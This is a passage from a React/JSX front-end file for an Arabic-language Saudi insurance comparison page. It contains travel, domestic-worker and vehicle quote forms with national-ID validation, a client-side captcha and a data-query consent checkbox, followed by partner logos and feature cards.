                {captchaError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>رمز التحقق غير صحيح</p>}
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0 md:self-end relative">
                {(() => { const isFormComplete = travelId.length === 10 && !travelIdError && captchaInput; return (
                  <button onClick={() => { if (!agreed) { setAgreementHighlight(false); setTimeout(() => setAgreementHighlight(true), 50); setTimeout(() => setAgreementHighlight(false), 1500); return; } handleTravelSubmit(); }} disabled={isSearching || !isFormComplete} className={`w-full md:w-auto px-12 rounded-lg text-white font-bold text-base transition-all ${isFormComplete && !isSearching ? 'hover:opacity-90 cursor-pointer' : 'opacity-50 cursor-not-allowed'}`} style={{ backgroundColor: '#f5a623', height: '48px' }}>
                    <div className="flex items-center justify-center gap-2">{isSearching && (<svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>)}إظهار العروض</div>
                  </button>); })()}
                <div className={`hidden md:flex absolute right-0 items-center gap-2 mt-2 whitespace-nowrap group rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                  <input type="checkbox" id="agree-travel-d" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4" />
                  <label htmlFor="agree-travel-d" className="text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label>
                </div>
                <div className="md:hidden"><div className={`flex items-center gap-2 mt-2 rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl"><input type="checkbox" id="agree-travel-m" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4 flex-shrink-0" /><label htmlFor="agree-travel-m" className="text-xs sm:text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label></div></div>
              </div>
            </div>
          </div>
          ) : activeTab === 'domestic' ? (
          <div className="bg-white px-4 md:px-10 lg:px-14 pt-4 pb-8 md:pb-16">
            <div className="flex flex-col md:flex-row items-stretch md:items-end gap-4 md:gap-6">
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">هوية الكفيل / رقم الإقامة</label>
                <input type="text" inputMode="numeric" pattern="[0-9]*" placeholder="هوية الكفيل / رقم الإقامة" value={domesticId} onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setDomesticId(v); if (v.length < 10) { setDomesticIdError(''); } else if (v.length === 10) { setDomesticIdError(validateSaudiId(v)); } }} maxLength={10} className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${domesticIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }} onFocus={(e) => e.target.style.color = '#1a5276'} onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }} />
                {domesticIdError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>{domesticIdError}</p>}
              </div>
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">تاريخ الميلاد</label>
                <div className="flex gap-2">
                  <div className="flex-1 relative">
                    <div onClick={() => { setDomesticMonthOpen(!domesticMonthOpen); setDomesticYearOpen(false); }} className={`w-full px-4 py-3 border rounded-lg bg-white text-right cursor-pointer text-base font-bold ${domesticMonthOpen ? 'border-[#1a73a7]' : 'border-gray-200'}`} style={{ color: domesticBirthMonth ? '#1a5276' : '#ccc' }}>{domesticBirthMonth || 'شهر الميلاد'}<span className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400"><svg className={`w-4 h-4 transition-transform ${domesticMonthOpen ? 'rotate-180' : ''}`} fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></span></div>
                    {domesticMonthOpen && (<div className="absolute z-50 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-60 overflow-y-auto" style={{ scrollbarWidth: 'thin' }}>{arabicMonths.map((m, i) => (<div key={i} onClick={() => { setDomesticBirthMonth(m); setDomesticMonthOpen(false); }} className={`px-4 py-2 text-right cursor-pointer hover:bg-gray-100 text-base ${m === domesticBirthMonth ? 'bg-blue-50' : ''}`} style={{ color: '#1a5276', fontWeight: 'bold' }}>{m}</div>))}</div>)}
                  </div>
                  <div className="flex-1 relative">
                    <div onClick={() => { setDomesticYearOpen(!domesticYearOpen); setDomesticMonthOpen(false); }} className={`w-full px-4 py-3 border rounded-lg bg-white text-right cursor-pointer text-base font-bold ${domesticYearOpen ? 'border-[#1a73a7]' : 'border-gray-200'}`} style={{ color: domesticBirthYear ? '#1a5276' : '#ccc' }}>{domesticBirthYear || 'سنة الميلاد'}<span className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400"><svg className={`w-4 h-4 transition-transform ${domesticYearOpen ? 'rotate-180' : ''}`} fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg></span></div>
                    {domesticYearOpen && (<div className="absolute z-50 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-60 overflow-y-auto" style={{ scrollbarWidth: 'thin' }}>{Array.from({ length: 2026 - 1940 + 1 }, (_, i) => 2026 - i).map(y => (<div key={y} onClick={() => { setDomesticBirthYear(String(y)); setDomesticYearOpen(false); }} className={`px-4 py-2 text-right cursor-pointer hover:bg-gray-100 text-base ${String(y) === domesticBirthYear ? 'bg-blue-50' : ''}`} style={{ color: '#1a5276', fontWeight: 'bold' }}>{y}</div>))}</div>)}
                  </div>
                </div>
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className={`flex items-center gap-0 border rounded-lg overflow-hidden bg-white ${captchaError ? 'border-red-500' : 'border-gray-200'}`}>
                  <input type="text" inputMode="numeric" dir="ltr" value={captchaInput} onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, '')); setCaptchaError(false); }} className="flex-1 md:w-24 px-3 py-3 bg-white text-center focus:outline-none text-base font-bold border-none" style={{ color: captchaInput ? '#1a5276' : '#ccc' }} />
                  <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7] flex-shrink-0"><svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg></button>
                  <div dir="ltr" className="px-3 py-2 select-none flex items-center justify-center gap-0.5 flex-shrink-0" style={captchaVisual.bg}>{captchaCode.split('').map((digit, i) => (<span key={i + captchaCode} style={{ color: captchaVisual.digits[i]?.color || '#333', fontSize: captchaVisual.digits[i]?.fontSize || '24px', fontWeight: 'bold', transform: `rotate(${captchaVisual.digits[i]?.rotation || 0}deg)`, display: 'inline-block', textShadow: '1px 1px 0px rgba(0,0,0,0.1)' }}>{digit}</span>))}</div>
                </div>
                {captchaError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>رمز التحقق غير صحيح</p>}
              </div>
              <div className="w-full md:w-auto md:flex-shrink-0 md:self-end relative">
                {(() => { const isFormComplete = domesticId.length === 10 && !domesticIdError && domesticBirthMonth && domesticBirthYear && captchaInput; return (
                  <button onClick={() => { if (!agreed) { setAgreementHighlight(false); setTimeout(() => setAgreementHighlight(true), 50); setTimeout(() => setAgreementHighlight(false), 1500); return; } handleDomesticSubmit(); }} disabled={isSearching || !isFormComplete} className={`w-full md:w-auto px-12 rounded-lg text-white font-bold text-base transition-all ${isFormComplete && !isSearching ? 'hover:opacity-90 cursor-pointer' : 'opacity-50 cursor-not-allowed'}`} style={{ backgroundColor: '#f5a623', height: '48px' }}>
                    <div className="flex items-center justify-center gap-2">{isSearching && (<svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>)}إظهار العروض</div>
                  </button>); })()}
                <div className={`hidden md:flex absolute right-0 items-center gap-2 mt-2 whitespace-nowrap group rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                  <input type="checkbox" id="agree-dom-d" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4" />
                  <label htmlFor="agree-dom-d" className="text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label>
                </div>
                <div className="md:hidden"><div className={`flex items-center gap-2 mt-2 rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl"><input type="checkbox" id="agree-dom-m" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4 flex-shrink-0" /><label htmlFor="agree-dom-m" className="text-xs sm:text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>أوافق على منح حق الاستعلام</label></div></div>
              </div>
            </div>
          </div>
          ) : activeTab === 'vehicles' ? (
          <div className="bg-white px-4 md:px-10 lg:px-14 pt-4 pb-8 md:pb-16">
            <div className="flex flex-col md:flex-row items-stretch md:items-end gap-4 md:gap-6">
              {/* Column 1: الغرض من التأمين + رقم الهوية */}
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">الغرض من التأمين</label>
                <div className="flex gap-2 mb-3">
                  <label className={`flex-1 flex items-center justify-center gap-2 cursor-pointer px-3 py-2 md:py-1.5 text-sm font-bold transition-all border ${
                    insuranceType === "new" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="insuranceType" value="new" checked={insuranceType === "new"} onChange={() => setInsuranceType("new")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>تأمين جديد</span>
                  </label>
                  <label className={`flex-1 flex items-center justify-center gap-2 cursor-pointer px-3 py-2 md:py-1.5 text-sm font-bold transition-all border ${
                    insuranceType === "transfer" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="insuranceType" value="transfer" checked={insuranceType === "transfer"} onChange={() => setInsuranceType("transfer")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>نقل ملكية</span>
                  </label>
                </div>
                {insuranceType === "transfer" ? (
                  <>
                    <div className="flex flex-col sm:flex-row md:flex-row gap-2">
                      <input
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        placeholder="رقم هوية البائع"
                        value={nationalId}
                        onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setNationalId(v); if (v.length < 10) { setNationalIdError(''); } else if (v.length === 10) { const err = validateSaudiId(v); setNationalIdError(err); } }}
                        onKeyDown={(e) => { if (e.key === '-' || e.key === '.' || e.key === 'e' || e.key === '+') e.preventDefault(); }}
                        maxLength={10}
                        className={`w-full sm:flex-1 md:flex-1 md:min-w-0 px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${nationalIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }}
                        onFocus={(e) => e.target.style.color = '#1a5276'}
                        onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }}
                      />
                      <input
                        type="text"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        placeholder="رقم هوية المشتري"
                        value={buyerId}
                        onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setBuyerId(v); if (v.length < 10) { setBuyerIdError(''); } else if (v.length === 10) { const err = validateSaudiId(v); setBuyerIdError(err); } }}
                        onKeyDown={(e) => { if (e.key === '-' || e.key === '.' || e.key === 'e' || e.key === '+') e.preventDefault(); }}
                        maxLength={10}
                        className={`w-full sm:flex-1 md:flex-1 md:min-w-0 px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${buyerIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }}
                        onFocus={(e) => e.target.style.color = '#1a5276'}
                        onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }}
                      />
                    </div>
                    {(nationalIdError || buyerIdError) && (
                      <div className="flex flex-col sm:flex-row md:flex-row gap-1 mt-1">
                        {nationalIdError && <p className="text-red-500 text-sm flex-1 text-center py-2 rounded-lg" style={{ backgroundColor: '#fee2e2' }}>{nationalIdError}</p>}
                        {buyerIdError && <p className="text-red-500 text-sm flex-1 text-center py-2 rounded-lg" style={{ backgroundColor: '#fee2e2' }}>{buyerIdError}</p>}
                      </div>
                    )}
                  </>
                ) : (
                  <>
                    <input
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      placeholder="رقم الهوية / الإقامة"
                      value={nationalId}
                      onChange={(e) => { const v = e.target.value.replace(/[^0-9]/g, ''); setNationalId(v); if (v.length < 10) { setNationalIdError(''); } else if (v.length === 10) { const err = validateSaudiId(v); setNationalIdError(err); } }}
                      onKeyDown={(e) => { if (e.key === '-' || e.key === '.' || e.key === 'e' || e.key === '+') e.preventDefault(); }}
                      maxLength={10}
                      className={`w-full px-4 py-3 border rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold ${nationalIdError ? 'border-red-500' : 'border-gray-200'}`} style={{ color: '#ccc' }}
                      onFocus={(e) => e.target.style.color = '#1a5276'}
                      onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }}
                    />
                    {nationalIdError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>{nationalIdError}</p>}
                  </>
                )}
              </div>
                {/* Column 4:: نوع تسجيل المركبة + الرقم التسلسلي */}
              <div className="w-full md:flex-1 md:min-w-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">نوع تسجيل المركبة</label>
                <div className="flex gap-2 mb-3">
                  <label className={`flex-1 flex items-center justify-center gap-2 cursor-pointer px-3 py-2 md:py-1.5 text-sm font-bold transition-all border ${
                    vehicleType === "form" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="vehicleType" value="form" checked={vehicleType === "form"} onChange={() => setVehicleType("form")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>استمارة</span>
                  </label>
                  <label className={`flex-1 flex items-center justify-center gap-2 cursor-pointer px-3 py-2 md:py-1.5 text-sm font-bold transition-all border ${
                    vehicleType === "customs" ? "bg-[#1a5276] text-white border-[#1a5276]" : "bg-gray-100 text-[#1a5276] border-transparent"
                  }`} style={{ borderRadius: '5px' }}>
                    <input type="radio" name="vehicleType" value="customs" checked={vehicleType === "customs"} onChange={() => setVehicleType("customs")} className="w-4 h-4" style={{ accentColor: '#f5a623' }} />
                    <span>بطاقة جمركية</span>
                  </label>
                </div>
                {vehicleType === "customs" ? (
                  <div className="flex flex-col sm:flex-row md:flex-row gap-2">
                    <div className="w-full sm:flex-1 md:flex-1 relative">
                      <div
                        onClick={() => setYearDropdownOpen(!yearDropdownOpen)}
                        className={`w-full px-4 py-3 border rounded-lg bg-white text-right cursor-pointer text-base font-bold appearance-none ${yearDropdownOpen ? 'border-[#1a73a7]' : 'border-gray-200'}`}
                        style={{ color: manufactureYear ? '#1a5276' : '#ccc' }}
                      >
                        {manufactureYear || 'سنة صنع المركبة'}
                      </div>
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                        <svg className={`w-4 h-4 transition-transform ${yearDropdownOpen ? 'rotate-180' : ''}`} fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
                      </span>
                      {yearDropdownOpen && (
                        <div className="absolute z-50 w-full mt-1 bg-white border border-gray-200 rounded-lg shadow-lg max-h-60 overflow-y-auto" style={{ scrollbarWidth: 'thin' }}>
                          {Array.from({ length: 2026 - 1919 + 1 }, (_, i) => 2026 - i).map(y => (
                            <div
                              key={y}
                              onClick={() => { setManufactureYear(String(y)); setYearDropdownOpen(false); }}
                              className={`px-4 py-2 text-right cursor-pointer hover:bg-gray-100 text-base ${String(y) === manufactureYear ? 'bg-blue-50' : ''}`}
                              style={{ color: '#1a5276', fontWeight: 'bold' }}
                            >
                              {y}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                    <div className="w-full sm:flex-1 md:flex-1 relative">
                      <input
                        type="text"
                        inputMode="numeric"
                        placeholder="الرقم الجمركي"
                        value={customsNumber}
                        onChange={(e) => setCustomsNumber(e.target.value.replace(/\D/g, ''))}
                        className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#ccc' }}
                        onFocus={(e) => e.target.style.color = '#1a5276'}
                        onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }}
                      />
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-blue-400 cursor-pointer">
                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                      </span>
                    </div>
                  </div>
                ) : (
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      placeholder="الرقم التسلسلى"
                      value={serialNumber}
                      onChange={(e) => setSerialNumber(e.target.value.replace(/\D/g, ''))}
                      className="w-full px-4 py-3 border border-gray-200 rounded-lg bg-white text-right focus:outline-none focus:border-[#1a73a7] text-base font-bold" style={{ color: '#ccc' }}
                      onFocus={(e) => e.target.style.color = '#1a5276'}
                      onBlur={(e) => { e.target.style.color = e.target.value ? '#1a5276' : '#ccc' }}
                    />
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-blue-400 cursor-pointer">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                    </span>
                  </div>
                )}
              </div>
              {/* Column 3: رمز التحقق */}
              <div className="w-full md:w-auto md:flex-shrink-0">
                <label className="block text-sm text-gray-600 mb-2 text-right font-bold">رمز التحقق</label>
                <div className={`flex items-center gap-0 border rounded-lg overflow-hidden bg-white ${captchaError ? 'border-red-500' : 'border-gray-200'}`}>
                <input
                  type="text"
                  inputMode="numeric"
                  dir="ltr"
                  value={captchaInput}
                  onChange={(e) => { setCaptchaInput(e.target.value.replace(/\D/g, '')); setCaptchaError(false); }}
                  className="flex-1 md:w-24 px-3 py-3 bg-white text-center focus:outline-none text-base font-bold border-none"
                  style={{ color: captchaInput ? '#1a5276' : '#ccc' }}
                />
                <button onClick={generateCaptcha} className="px-1.5 text-gray-400 hover:text-[#1a73a7] flex-shrink-0">
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                  </svg>
                </button>
                <div 
                  dir="ltr"
                  className="px-3 py-2 select-none flex items-center justify-center gap-0.5 flex-shrink-0"
                  style={captchaVisual.bg}
                >
                  {captchaCode.split('').map((digit, i) => (
                    <span key={i + captchaCode} style={{ 
                      color: captchaVisual.digits[i]?.color || '#333', 
                      fontSize: captchaVisual.digits[i]?.fontSize || '24px', 
                      fontWeight: 'bold',
                      transform: `rotate(${captchaVisual.digits[i]?.rotation || 0}deg)`,
                      display: 'inline-block',
                      textShadow: '1px 1px 0px rgba(0,0,0,0.1)'
                    }}>{digit}</span>
                  ))}
                </div>
                </div>
                {captchaError && <p className="text-red-500 text-sm text-center py-2 rounded-lg mt-1" style={{ backgroundColor: '#fee2e2' }}>رمز التحقق غير صحيح</p>}
              </div>
              {/* Button + Agreement */}
              <div className="w-full md:w-auto md:flex-shrink-0 md:self-end relative">
                {(() => {
                  const isFormComplete = insuranceType === "transfer"
                    ? (nationalId.length === 10 && !nationalIdError && buyerId.length === 10 && !buyerIdError && serialNumber && captchaInput)
                    : (nationalId.length === 10 && !nationalIdError && serialNumber && captchaInput);
                  return (
                <button
                  onClick={() => { if (!agreed) { setAgreementHighlight(false); setTimeout(() => setAgreementHighlight(true), 50); setTimeout(() => setAgreementHighlight(false), 1500); return; } handleSubmit(); }}
                  disabled={isSearching || !isFormComplete}
                  className={`w-full md:w-auto px-12 rounded-lg text-white font-bold text-base transition-all ${isFormComplete && !isSearching ? 'hover:opacity-90 cursor-pointer' : 'opacity-50 cursor-not-allowed'}`}
                  style={{ backgroundColor: '#f5a623', height: '48px' }}
                >
                  <div className="flex items-center justify-center gap-2">
                    {isSearching && (
                      <svg className="animate-spin h-5 w-5 text-white" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                    )}
                    إظهار العروض
                  </div>
                </button>
                  );
                })()}
                {/* Desktop: absolute positioned with hover tooltip (original) */}
                <div className={`hidden md:flex absolute right-0 items-center gap-2 mt-2 whitespace-nowrap group rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                  <input type="checkbox" id="agree-desktop" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4" />
                  <label htmlFor="agree-desktop" className="text-sm cursor-pointer relative" style={{ color: '#1a5276', fontWeight: 400 }}>
                    أوافق على منح حق الاستعلام
                    <div className="hidden group-hover:block absolute top-full left-0 mt-2 rounded-lg shadow-lg p-3 text-right text-sm leading-relaxed z-50" style={{ backgroundColor: '#f5f5f5', color: '#1a5276', fontWeight: 400, whiteSpace: 'normal', width: '380px' }}>
                      أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                    </div>
                  </label>
                </div>
                {/* Mobile: normal flow with tap-to-show */}
                <div className="md:hidden">
                  <div className={`flex items-center gap-2 mt-2 rounded-lg px-2 py-1 transition-all duration-300 ${agreementHighlight ? 'bg-red-200 border border-red-400' : ''}`} dir="rtl">
                    <input type="checkbox" id="agree-mobile" checked={agreed} onChange={(e) => { setAgreed(e.target.checked); setAgreementHighlight(false); }} className="w-4 h-4 flex-shrink-0" />
                    <label htmlFor="agree-mobile" className="text-xs sm:text-sm cursor-pointer" style={{ color: '#1a5276', fontWeight: 400 }}>
                      أوافق على منح حق الاستعلام
                    </label>
                  </div>
                  {agreed && (
                    <div className="mt-2 rounded-lg shadow-lg p-3 text-right text-sm leading-relaxed z-50" style={{ backgroundColor: '#f5f5f5', color: '#1a5276', fontWeight: 400, whiteSpace: 'normal', maxWidth: '100%' }}>
                      أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
          ) : null}
        </div>
      </div>

      {/* Decorative SVGs on white background below the card */}
      <div className="relative" style={{ height: '0px', overflow: 'visible' }}>
        <img src="/images/a1/b3.svg" alt="" className="pointer-events-none" style={{ height: window.innerWidth < 768 ? '300px' : '700px', opacity: window.innerWidth < 768 ? 0.06 : 0.12, position: 'absolute', left: '1%', top: window.innerWidth < 768 ? '-200px' : '-500px', zIndex: 1 }} />
      </div>

      {/* Partners Bar */}
      <section className="mt-16 md:mt-32 py-4 md:py-6 pb-6 md:pb-10 relative z-10">
        <div className="px-3 md:px-16 lg:px-28">
          <div className="bg-white rounded-lg shadow-sm border border-gray-100 relative z-10" style={{ overflow: 'hidden' }}>
            <div className="flex flex-col md:flex-row items-center px-3 md:px-5 py-4 md:py-6 gap-4 md:gap-0" style={{ overflow: 'hidden' }}>
              {/* Authorization info */}
              <div className="flex-shrink-0 flex items-center gap-3 md:gap-4 md:pl-6">
                <div className="relative" style={{ paddingTop: '16px' }}>
                  <span className="absolute text-[10px] md:text-xs font-bold" style={{ color: '#146494', top: '0', right: '0' }}>مصرح من:</span>
                  <img src="/images/a1/g1.svg" alt="هيئة التأمين" className="h-10 md:h-14" />
                </div>
                <div className="h-12 md:h-16 w-px bg-gray-300"></div>
                <img src="/images/a1/g3.svg" alt="23 شركة تأمين" className="h-16 md:h-24" />
              </div>
              {/* Auto-scrolling company logos carousel */}
              <InsuranceLogosCarousel />
            </div>
          </div>
        </div>
      </section>
      </div>{/* end bg-gray-50 wrapper */}

      {/* Features Section - طريقك آمن مع بي كير */}
      <section className="py-8 md:py-16 bg-gray-50">
        <div className="container mx-auto px-4 lg:px-8">
          <h2 className="text-2xl md:text-4xl font-bold text-center mb-8 md:mb-14" style={{ color: primaryBlue }}>
            طريقك آمن مع بي كير
          </h2>
          
          {/* Top Row - 4 cards */}
          <div className="grid grid-cols-2 md:grid-cols-1 md:hidden lg:hidden gap-3 mb-3 max-w-6xl mx-auto">
            {/* Mobile: 2 cols grid */}
          </div>
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-4 mb-3 md:mb-4 max-w-6xl mx-auto">
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f1.svg" alt="تأمينك في دقيقة" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>تأمينك في دقيقة</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>نقارن لك كل عروض الأسعار بشكل فوري من كل شركات التأمين</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f2.svg" alt="فصّل تأمينك" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>فصّل تأمينك</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>أنواع تأمين متعددة: تأمين ضد الغير، تأمين مميز، تأمين شامل وقيمة تحمل متنوعة</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f3.svg" alt="أسعار أقل" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>أسعار أقل</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>عندنا فريق يراقب كل صغيرة و كبيرة في السوق و يضمن أن سعرك الأقل و المناسب لك وفق احتياجك</p>
            </div>
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
              <div className="w-10 h-10 md:w-12 md:h-12 mx-auto mb-3 md:mb-4 flex items-center justify-center">
                <img src="/images/a1/f4.svg" alt="جدول تأمينك" className="w-8 h-8 md:w-10 md:h-10" />
              </div>
              <h3 className="font-bold mb-2 md:mb-3 text-sm md:text-xl" style={{ color: '#146494' }}>جدول تأمينك</h3>
              <p className="text-xs md:text-lg leading-relaxed" style={{ color: '#146494' }}>نرسل لك إشعارات تذكيرية لتجديد تأمينك وتقدر تجدول تاريخ بدايته</p>
            </div>
          </div>

          {/* Bottom Row - 4 cards */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-4 max-w-6xl mx-auto">
            <div className="bg-white px-2 md:px-3 py-6 md:py-12 text-center shadow-sm hover:shadow-md transition-shadow" style={{ borderRadius: '15px' }}>
